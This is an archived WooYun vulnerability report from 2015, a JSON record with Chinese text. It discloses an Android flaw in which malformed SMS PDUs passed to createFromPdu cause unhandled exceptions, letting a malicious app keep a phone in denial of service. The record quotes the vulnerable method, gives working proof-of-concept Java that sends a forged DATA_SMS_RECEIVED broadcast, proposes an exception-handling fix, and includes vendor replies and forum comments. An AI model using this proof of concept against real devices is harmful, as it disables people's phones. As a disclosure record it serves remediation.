{"id": 66305, "wybug_id": "wooyun-2015-0128652", "wybug_title": "安卓未处理异常漏洞导致手机可持续被DoS攻击", "wybug_corp": "Google", "wybug_author": "0xseven", "wybug_date": "2015-07-26 14:32", "wybug_open_date": "2015-10-27 09:34", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-27：\t细节向公众公开  简要描述： 安卓代码包括最新5.1.1存在未处理异常漏洞，导致手机可被恶意APP持续DoS攻击而无法使用 详细说明：  安卓开放API：createFromPdu 未正确处理内部函数异常检测，用户可以构造任意PDU数据导致内调函数异常返回null数据并被包装为正常SmsMessage对象供后续使用，导致任意对该API调用的程序产生潜在DoS攻击风险。\npublic static SmsMessage createFromPdu(byte[] pdu, String format) {        SmsMessageBase wrappedMessage;        if (SmsConstants.FORMAT_3GPP2.equals(format)) {            wrappedMessage = com.android.internal.telephony.cdma.SmsMessage.createFromPdu(pdu);        } else if (SmsConstants.FORMAT_3GPP.equals(format)) {            wrappedMessage = com.android.internal.telephony.gsm.SmsMessage.createFromPdu(pdu);        } else {            Rlog.e(LOG_TAG, \"createFromPdu(): unsupported message format \" + format);            return null;        }        return new SmsMessage(wrappedMessage);    }\n   漏洞证明：  \nIntent intentSent = new Intent(\"android.intent.action.DATA_SMS_RECEIVED\", null);\t\t\t\tintentSent.setData(Uri.parse(\"sms://localhost:7275\"));\t\t\t\tint pducount = 3;\t\t\t\tint index = 0;\t\t\t\tObject[] epdu = new Object[pducount];\t\t\t\twhile(index < pducount){\t\t\t\t\tbyte[] pdu = {00, 02, 00, 02, 10, 65, 61, 60, 80, 90, 25, 12, 23, 61, 60, 80, 01, 25, 12, 23, 00};\t\t\t\t\tObject[] item = new Object[pdu.length];\t\t\t\t\tint i = 0;\t\t\t\t\tfor(byte b :pdu) item[i++] = b;\t\t\t\t\tepdu[index] = pdu;\t\t\t\t\tindex ++;\t\t\t\t}\t\t\t\tintentSent.putExtra(\"pdus\", epdu);\t\t\t\tintentSent.putExtra(\"format\", \"3gpp\");\t\t\t\tintentSent.putExtra(\"subscription\", 1);\t\t\t\t\t\t\t\tsendBroadcast(intentSent);\n   修复方案：  调用者增加异常捕获即可\ntry{\t\t    checkSmsSuplInit(intent);\t\t}catch(ClassCastException e){\t\t    Log.e(TAG, \"Malformed SMS message data\");\t        }\n   版权声明：转载请注明来源 0xseven@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-07-29 09:33 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-24 14:33 |    \t\t高小厨 \t\t\t( 普通白帽子  |\t\t\t        Rank:821 漏洞数:74        | 不会吹牛的小二不是好厨子！)\t\t \n  牛    \n     2015-07-24 14:38 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:567 漏洞数:108        | 低调求发展)\t\t \n  DIAO    \n     2015-07-24 14:50 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:9        | ̷̸̨̀͒̏̃ͦ̈́̾( 漏洞不审不开心，...)\t\t \n  叼    \n     2015-07-24 15:07 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:48        | [code]时光如水，总是无言，你若安好，便是...)\t\t \n  牛逼    \n     2015-07-24 15:18 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:71        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  猜是某系统应用某处没做异常捕获导致本地拒绝服务？    \n     2015-07-24 17:03 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  能远程不    \n     2015-07-24 17:06 |    \t\t一个人　　　　　　　 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 终于注册上了...那个头像怎么设置？)\t\t \n  神一般的存在    \n     2015-07-24 17:07 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | 我是来打酱油的。)\t\t \n  @Google 来吗？    \n     2015-07-24 18:44 |    \t\t末影人 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:9        | 末影人(Enderman)是一个三个方格高的人形生...)\t\t \n  @0xseven 影响那些版本，包括Android M吗？    \n     2015-07-24 20:49 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  ……    \n     2015-07-24 20:54 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:45        )\t\t \n  吊吊。。。。    \n     2015-07-29 10:13 |    \t\t小荷才露尖尖角 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | less is more)\t\t \n  某位大牛的小号？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}